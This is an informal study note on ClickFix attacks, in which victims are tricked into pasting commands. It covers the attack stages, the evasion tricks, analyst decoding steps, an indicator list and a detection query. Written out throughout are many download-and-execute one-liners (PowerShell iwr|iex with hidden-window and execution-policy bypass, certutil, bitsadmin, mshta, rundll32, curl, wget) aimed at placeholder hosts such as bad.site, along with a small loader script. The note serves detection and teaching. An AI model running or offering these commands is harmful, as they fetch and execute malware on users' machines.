ClickFix:
  ClickFix is a social engineering + script based attack, where the victim is tricked to copy-paste a command
  (usually in Run/CMD/Powershell/Terminal) that downloads malware.

Instead of exploiting the software, attacker makes the user to execute commands itselves.

Typical lure:
"Fix your PC"
"Update browser"
"Install codec"
"Captcha verification"
"Zoom audio fix"

Victim copies command ==> runs it ==> Malware downloads.

Clickfix AttackFlow (End-to-End).

Website / Email lure
        ↓
Fake instruction "Press Win + R"
        ↓
User pastes command
        ↓
PowerShell / CMD executes
        ↓
Payload downloaded
        ↓
Second stage executed
        ↓
Persistence / C2 connection

Initial Access: user runs --> Powershell executes
Press Windows + R
Paste below:
powershell -c "iwr http://malicious.site/file.ps1 | iex"

Powershell      ==> launches powershell
-c              ==> runs command
iwr             ==> Invoke-WebRequest (download file)
|               ==> Pipe output
iex             ==> Invoke-Expression (Execute)

Meaning ==> run"download .ps1" Execute.

Stage 1 Loader(Downloader)
$u="http://site/payload.exe"
Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
Start-Process $env:TEMP\file.exe

Meaning:
  Download payload.exe
  write/save it to TEMP
  Execute

Stage 2 Payload
  This is real malware: Info stealer/RAT/Loader/Lumma/Redline/AsyncRAT

Defense Evasion:
  Clickfix often uses:
    powershell -enc SQBtAHAA...
  Encoded Base64 command

String Splitting:  "po"+"wer"+"shell"
Environment Varables:  $env:APPDATA
Sandbox Evasion: ?token=unused
    Purpose:
        Only real user gets payload
        Sandbox blocked
        One-time download

Analysis:
  Identify Command:
    Look for
        Powershell/CMD/mshta/rundll32/curl/ditsadmin
    Eg: mshta http://site/file.hta

  Decode it encoded
    Look for 
        -enc
        -base64
    echo BASE64 | base64 -d

    Extract URLs
        Find http/https
    These are: payload/C2/Staging

Identify Download Method:
  Common clickfix download comands:
      Powershell: Invoke-Webrequest/IWR/curl/wget
      CMD: certutil -urlcache -split -f / bitsadmin /transfer

Look for Execution: Start-Process/iex/Cmd /c

Clickfix eg:
  powershell -w hidden -nop -c "iwr http://bad.site/a.ps1 | iex"

Examples:
powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex" ==> Powersehll
Meaning:
Run hidden PowerShell, ignore security, download script from internet, execute immediately.

certutil -urlcache -split -f http://bad.site/file.exe file.exe    ==> CMD
Meaning:
Download malware using built-in tool.

bitsadmin /transfer job http://bad.site/file.exe C:\Temp\file.exe
mshta http://bad.site/file.hta (Attackers use JavaScript/VBScript/Downloader)
rundll32.exe url.dll,FileProtocolHandler http://bad.site
curl http://bad.site/file.exe -o file.exe
wget http://bad.site/file.exe -OutFile file.exe

-w hidden      ==> hide window (so, users dont see)
-nop           ==> no profile (do not load PowerShell user profile & runs faster & avoid security scripts)
iwr            ==> Invoke-Webrequest (download), same as curl/wget
iex(Invoke-Expression) ==> Execute
hidden         ==> Stealth
-writeout      ==> Save/write to
-ep bypass     ==> ExecutionPolicy bypass (Ignore Powershell security restrictions & allow unsigned scripts)
-c ''          ==> run, what ever in ''
|               ==> Pipe output, take output of first command & send it to next command, here download script & execute it immediately, Not saving file
Certutil        ==> windows certificate utility(abused to download)
cmd /c          ==> close command prompt
-urlcache        ==> download file from URL
-split          ==>split file into chunks
-f              ==> Force overwrite
bitsadmin        ==>  windows background downloader
/transfer        ==> start download (used for stealth downloads)
mshta            ==> Executes HTML Applications
rundll32.exe    ==> open malicious URL/Executes DLL
curl            ==> output file
Start-Process file.exe  ==> Execute file.exe
& file.exe      ==> Execute file.exe
cmd /c        ==> Execute file.exe




Clickfix Variants:
  1.  Multi-satge
        Run ==> PS script==>HTA==>Exe
  2. 7zip Portable drop
      Purpose: Extract payload & Avoid AV detection
  3. LOL(Living off the land)
      Uses: mshta/regsvr32/rundll32

DeviceProcessEvents
| where InitiatingProcessFileName == "explorer.exe"
| where FileName in ("powershell.exe","cmd.exe")

Stage 1
powershell -w hidden -nop -c "iwr http://site/loader.ps1 | iex"
"Stage 2
loader.ps1 downloads payload.exe
Stage 3:
payload.exe executed
stage 4:
C2 connection established


Common clickfix Indicators:
powershell
iwr
iex
certutil
bitsadmin
mshta
rundll32
curl
encoded command
temp folder execution


Parameter                	                    Meaning                                    	Why attacker uses
powershell	                                    run PowerShell	                            execute script
-w hidden	                                      hide window	                                stealth
-nop	                                          no profile	                                faster
-ep bypass	                                    bypass security	                            run unsigned
-c	                                            run                                         command	execute
iwr	                                            download	                                  payload
iex	                                            execute	                                    run script
-enc	                                          encoded	                                    obfuscation
certutil	                                      download	                                  LOLBIN
bitsadmin	                                      download	                                  stealth
mshta	                                          execute                                     HTA	script run
rundll32	                                      run                                         DLL	payload
curl	                                          download	                                  payload
wget	                                          download	                                  payload


BIG PICTURE:
User runs command
     ↓
Stager (Stage 0)  ==> Very small script whos job is to download next stage.
     ↓
Loader (Stage 1)  ==> A Pgm/script that loads the real malware into memory/downloads additional component
     ↓
Stage 2 Payload  ==> Intermediate payload that setup environment before final malware
     ↓
Final Payload    ==>The Actual Malicious tool attacker wants to un
     ↓
C2 / Persistence

Loader vs stager:
Type	                  Size                    	Role
Stager	                very small	              download next stage
Loader	                larger	                  prepare & run payload

Memory trick:

Stager = fetch
Loader = launch

Real ClickFix Multi-stage Example:
Stage 0 - Stager (User runs)
powershell -c "iwr http://site/1.ps1 | iex"
Stage 1 - Loader
1.ps1 downloads loader.exe
Stage 2 - Setup
loader.exe downloads payload.dll
Final Payload
payload.dll injected into explorer.exe

VISIUAL FLOW:

ClickFix command
       ↓
Stager (small script)
       ↓
Loader (downloads malware)
       ↓
Stage 2 (prepare system)
       ↓
Final payload (RAT/Stealer)



















































